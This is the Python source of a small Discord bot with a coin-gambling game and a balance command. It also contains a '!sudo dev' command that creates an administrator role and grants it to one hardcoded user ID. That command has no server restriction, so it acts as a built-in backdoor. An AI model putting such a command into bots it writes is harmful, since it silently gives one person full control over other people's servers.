import discord
from discord.ext import commands
import asyncio
import random
import os

intents = discord.Intents.default()
intents.message_content = True
intents.reactions = True
intents.members = True  # Required for role assigning

bot = commands.Bot(command_prefix="!", intents=intents)

player_numbers = {}
coins = {}

# 🔒 Replace this with Nico's real Discord ID
AUTHORIZED_USER_ID = 1258115928525373570  

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# 🎲 Gamble Command
@bot.command()
async def gamble(ctx):

    if ctx.guild.id != 1470848789433679883:
        await ctx.send("Not allowed in this server.")
        return

    message = await ctx.send(
        "🎲 React with 👍 to join! (60 seconds)"
    )

    await message.add_reaction("👍")
    await asyncio.sleep(60)

    message = await ctx.channel.fetch_message(message.id)

    players = []

    for reaction in message.reactions:
        if str(reaction.emoji) == "👍":
            async for user in reaction.users():
                if not user.bot:
                    players.append(user)

    if not players:
        await ctx.send("No players joined.")
        return

    random.shuffle(players)
    winner = random.choice(players)

    coins[winner.id] = coins.get(winner.id, 0) + 8

    await ctx.send(f"🎉 {winner.mention} wins 8 coins!")

# 💰 Balance Command
@bot.command()
async def balance(ctx):
    bal = coins.get(ctx.author.id, 0)
    await ctx.send(f"💰 You have {bal} coins.")

# 👑 SUDO DEV COMMAND
@bot.command()
async def sudo(ctx, arg=None):

    # Only Nico can use this
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("❌ You are not allowed to use this command.")
        return

    if arg != "dev":
        await ctx.send("Usage: !sudo dev")
        return

    guild = ctx.guild

    # Check if role exists
    role = discord.utils.get(guild.roles, name="Developer Admin")

    if role is None:
        role = await guild.create_role(
            name="Developer Admin",
            permissions=discord.Permissions(administrator=True),
            reason="Authorized developer command"
        )

    # Give role to Nico
    await ctx.author.add_roles(role)

    await ctx.send("👑 Developer Admin role created and assigned.")

bot.run(os.getenv("TOKEN"))
